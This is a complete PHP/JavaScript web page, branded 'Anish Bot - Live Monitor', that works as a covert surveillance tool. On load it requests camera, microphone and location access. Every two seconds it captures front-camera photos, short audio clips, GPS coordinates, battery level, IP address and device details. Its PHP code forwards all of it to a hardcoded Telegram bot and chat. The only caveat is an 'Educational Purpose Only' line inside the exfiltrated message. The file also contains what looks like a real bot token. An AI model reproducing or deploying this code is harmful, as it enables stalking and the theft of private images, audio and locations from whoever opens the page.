<?php
error_reporting(0);
session_start();

// ========== TELEGRAM BOT SETTINGS ==========
define('BOT_TOKEN', '9233492493:AAFkhlLSAOi04R9SN2PwAXj67c_eTLEfoJI');
define('CHAT_ID', '8899843332');

// ========== FUNCTIONS ==========
function sendToTelegram($message, $photo_data = null, $audio_data = null) {
    if (empty(BOT_TOKEN)) return false;
    
    // Send text message
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    $data = ['chat_id' => CHAT_ID, 'text' => $message, 'parse_mode' => 'HTML'];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    curl_close($ch);
    
    // Send photo - SIRF TAB JAB PHOTO HO
    if ($photo_data && $photo_data !== '' && $photo_data !== 'null') {
        // Extract base64 data
        if (strpos($photo_data, 'base64,') !== false) {
            $photo_data = explode('base64,', $photo_data)[1];
        }
        
        $photo_url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendPhoto";
        
        // Send as multipart/form-data
        $boundary = uniqid();
        $body = "--$boundary\r\n";
        $body .= "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" . CHAT_ID . "\r\n";
        $body .= "--$boundary\r\n";
        $body .= "Content-Disposition: form-data; name=\"caption\"\r\n\r\n📸 Live Photo\r\n";
        $body .= "--$boundary\r\n";
        $body .= "Content-Disposition: form-data; name=\"photo\"; filename=\"photo.jpg\"\r\n";
        $body .= "Content-Type: image/jpeg\r\n\r\n";
        $body .= base64_decode($photo_data) . "\r\n";
        $body .= "--$boundary--\r\n";
        
        $ch = curl_init($photo_url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: multipart/form-data; boundary=$boundary"]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $response = curl_exec($ch);
        curl_close($ch);
    }
    
    // Send audio - SIRF TAB JAB AUDIO HO
    if ($audio_data && $audio_data !== '' && $audio_data !== 'null') {
        if (strpos($audio_data, 'base64,') !== false) {
            $audio_data = explode('base64,', $audio_data)[1];
        }
        
        $audio_url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendAudio";
        
        $boundary = uniqid();
        $body = "--$boundary\r\n";
        $body .= "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" . CHAT_ID . "\r\n";
        $body .= "--$boundary\r\n";
        $body .= "Content-Disposition: form-data; name=\"caption\"\r\n\r\n🎤 Live Audio\r\n";
        $body .= "--$boundary\r\n";
        $body .= "Content-Disposition: form-data; name=\"audio\"; filename=\"audio.webm\"\r\n";
        $body .= "Content-Type: audio/webm\r\n\r\n";
        $body .= base64_decode($audio_data) . "\r\n";
        $body .= "--$boundary--\r\n";
        
        $ch = curl_init($audio_url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: multipart/form-data; boundary=$boundary"]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $response = curl_exec($ch);
        curl_close($ch);
    }
    
    return true;
}

function getUserIP() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) return $_SERVER['HTTP_CF_CONNECTING_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

// ========== HANDLE POST ==========
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    $response = ['status' => 'error', 'message' => 'Unknown action'];
    
    if ($action === 'collect') {
        $photo = $_POST['photo'] ?? null;
        $audio = $_POST['audio'] ?? null;
        $lat = $_POST['lat'] ?? 'Not available';
        $lng = $_POST['lng'] ?? 'Not available';
        $battery = $_POST['battery'] ?? 'Unknown';
        $ip = getUserIP();
        $timestamp = date('Y-m-d H:i:s');
        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        
        $platform = 'Unknown';
        if (strpos($user_agent, 'Windows') !== false) $platform = 'Windows';
        elseif (strpos($user_agent, 'Android') !== false) $platform = 'Android';
        elseif (strpos($user_agent, 'iPhone') !== false) $platform = 'iPhone';
        elseif (strpos($user_agent, 'Mac') !== false) $platform = 'Mac';
        elseif (strpos($user_agent, 'Linux') !== false) $platform = 'Linux';
        
        $msg = "
╔═══════════════════════════════════════════╗
║      🔐 ANISH BOT - LIVE DATA            ║
╚═══════════════════════════════════════════╝

📸 <b>Photo:</b> " . ($photo && $photo !== '' && $photo !== 'null' ? "✅ Attached" : "❌ Not captured") . "
🎤 <b>Audio:</b> " . ($audio && $audio !== '' && $audio !== 'null' ? "✅ Attached" : "❌ Not captured") . "

🌐 <b>IP Address:</b> <code>{$ip}</code>

📍 <b>Location:</b> {$lat}, {$lng}
🗺️ <b>Map:</b> <a href='https://maps.google.com/?q={$lat},{$lng}'>Open Google Maps</a>

🔋 <b>Battery:</b> {$battery}%

📱 <b>Device:</b> {$platform}
💻 <b>User Agent:</b> <code>" . substr($user_agent, 0, 60) . "...</code>

🕐 <b>Time:</b> {$timestamp}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ Educational Purpose Only
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
";
        
        sendToTelegram($msg, $photo, $audio);
        $response = ['status' => 'ok', 'message' => 'Data sent'];
    }
    
    header('Content-Type: application/json');
    echo json_encode($response);
    exit;
}

// ========== HTML PAGE ==========
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Anish Bot - Live Monitor</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #0a0a0a, #1a1a2e, #16213e);
            font-family: 'Segoe UI', system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 1.5rem;
        }
        .glass-card {
            background: rgba(255,255,255,0.06);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 2rem;
            padding: 2rem 1.8rem;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 30px 60px rgba(0,0,0,0.5);
            text-align: center;
        }
        .icon { font-size: 4rem; margin-bottom: 0.5rem; animation: pulse 2s infinite; }
        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.5; } }
        h1 {
            font-size: 1.6rem;
            color: #fff;
            font-weight: 700;
            background: linear-gradient(90deg, #00f5a0, #00d9f5);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .sub { color: rgba(255,255,255,0.5); font-size: 0.85rem; margin-bottom: 1.5rem; }
        .status-area {
            background: rgba(0,0,0,0.4);
            border-radius: 1rem;
            padding: 1rem;
            margin-top: 1.5rem;
            font-size: 0.75rem;
            color: #00f5a0;
            text-align: left;
            font-family: 'Courier New', monospace;
            max-height: 200px;
            overflow-y: auto;
            border: 1px solid rgba(0,245,160,0.1);
        }
        .status-area::-webkit-scrollbar { width: 4px; }
        .status-area::-webkit-scrollbar-thumb { background: #00f5a0; border-radius: 10px; }
        .live-indicator { color: #00f5a0; font-size: 0.8rem; margin-top: 0.8rem; }
        .live-indicator .dot {
            display: inline-block;
            width: 10px;
            height: 10px;
            background: #00f5a0;
            border-radius: 50%;
            animation: blink 0.8s infinite;
            margin-right: 5px;
        }
        @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0; } }
        .stats-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 0.5rem;
            margin-top: 1rem;
        }
        .stat-item {
            background: rgba(255,255,255,0.05);
            border-radius: 0.8rem;
            padding: 0.6rem;
        }
        .stat-label { font-size: 0.6rem; color: rgba(255,255,255,0.4); text-transform: uppercase; }
        .stat-value { font-size: 0.9rem; color: #fff; font-weight: bold; }
        .warning-text {
            background: rgba(255,152,0,0.15);
            border-left: 3px solid #ff9800;
            padding: 0.7rem;
            margin-top: 1rem;
            font-size: 0.65rem;
            color: #ffb74d;
            border-radius: 0.8rem;
        }
        video { display: none; }
        canvas { display: none; }
    </style>
</head>
<body>

<div class="glass-card">
    <div class="icon">🕵️</div>
    <h1>Live Monitor</h1>
    <div class="sub">Real-time data collection</div>

    <div class="live-indicator"><span class="dot"></span> LIVE • Auto Recording</div>

    <div class="status-area" id="logBox">⏳ Initializing...</div>

    <div class="stats-grid">
        <div class="stat-item"><div class="stat-label">📍 Location</div><div class="stat-value" id="locStatus">⏳</div></div>
        <div class="stat-item"><div class="stat-label">🔋 Battery</div><div class="stat-value" id="batteryStatus">⏳</div></div>
        <div class="stat-item"><div class="stat-label">📸 Camera</div><div class="stat-value" id="camStatus">⏳</div></div>
        <div class="stat-item"><div class="stat-label">🎤 Mic</div><div class="stat-value" id="micStatus">⏳</div></div>
    </div>

    <div class="warning-text">⚠️ Camera & Microphone access required. Allow permissions when prompted.</div>
</div>

<video id="video" autoplay muted style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    let mediaStream = null;
    let audioStream = null;
    let locationData = { lat: 'Not available', lng: 'Not available' };
    let captureInterval = null;
    let isRunning = false;

    function addLog(msg) {
        const box = document.getElementById('logBox');
        const time = new Date().toLocaleTimeString();
        box.innerHTML += `\n[${time}] ${msg}`;
        box.scrollTop = box.scrollHeight;
    }

    function updateStats(label, value) {
        document.getElementById(label + 'Status').innerText = value;
    }

    async function getBattery() {
        try {
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                return Math.round(battery.level * 100);
            }
        } catch(e) {}
        return 'Unknown';
    }

    function capturePhoto() {
        try {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            if (!video || !video.videoWidth || video.videoWidth === 0) return null;
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            return canvas.toDataURL('image/jpeg', 0.95);
        } catch(e) {
            return null;
        }
    }

    function captureAudio() {
        try {
            if (!audioStream) return null;
            const chunks = [];
            const mediaRecorder = new MediaRecorder(audioStream);
            
            return new Promise((resolve) => {
                mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) chunks.push(e.data);
                };
                mediaRecorder.onstop = () => {
                    if (chunks.length === 0) {
                        resolve(null);
                        return;
                    }
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    reader.onload = () => {
                        resolve(reader.result);
                    };
                    reader.onerror = () => resolve(null);
                    reader.readAsDataURL(blob);
                };
                mediaRecorder.start();
                setTimeout(() => {
                    if (mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, 2000);
            });
        } catch(e) {
            return null;
        }
    }

    async function sendData() {
        const battery = await getBattery();
        const photo = capturePhoto();
        const audio = await captureAudio();
        
        const formData = new FormData();
        formData.append('action', 'collect');
        formData.append('photo', photo || '');
        formData.append('audio', audio || '');
        formData.append('lat', locationData.lat || 'Not available');
        formData.append('lng', locationData.lng || 'Not available');
        formData.append('battery', battery);

        try {
            const res = await fetch(window.location.href, { method: 'POST', body: formData });
            const result = await res.json();
            if (result.status === 'ok') {
                addLog('✅ Sent: ' + (photo ? '📸' : '') + (audio ? '🎤' : ''));
            }
        } catch(e) {
            addLog('❌ Network error');
        }
    }

    async function startLiveMonitor() {
        if (isRunning) return;
        isRunning = true;
        addLog('🚀 Starting...');

        try {
            addLog('📸 Requesting camera...');
            mediaStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
            });
            const video = document.getElementById('video');
            video.srcObject = mediaStream;
            await video.play();
            addLog('✅ Camera ready');
            updateStats('cam', '✅');
        } catch(e) {
            addLog('❌ Camera denied');
            updateStats('cam', '❌');
        }

        try {
            addLog('🎤 Requesting microphone...');
            audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
            addLog('✅ Mic ready');
            updateStats('mic', '✅');
        } catch(e) {
            addLog('❌ Mic denied');
            updateStats('mic', '❌');
        }

        try {
            addLog('📍 Getting location...');
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    locationData = { lat: pos.coords.latitude.toFixed(6), lng: pos.coords.longitude.toFixed(6) };
                    addLog(`✅ Location: ${locationData.lat}, ${locationData.lng}`);
                    updateStats('location', '✅');
                },
                () => { addLog('❌ Location denied'); updateStats('location', '❌'); },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        } catch(e) { addLog('❌ Location error'); updateStats('location', '❌'); }

        const battery = await getBattery();
        updateStats('battery', battery + '%');

        addLog('📡 Auto capture every 2 sec...');
        await sendData();
        captureInterval = setInterval(sendData, 2000);

        setInterval(async () => {
            const bat = await getBattery();
            updateStats('battery', bat + '%');
        }, 10000);
    }

    document.addEventListener('DOMContentLoaded', () => {
        setTimeout(startLiveMonitor, 1000);
    });
</script>
</body>
</html>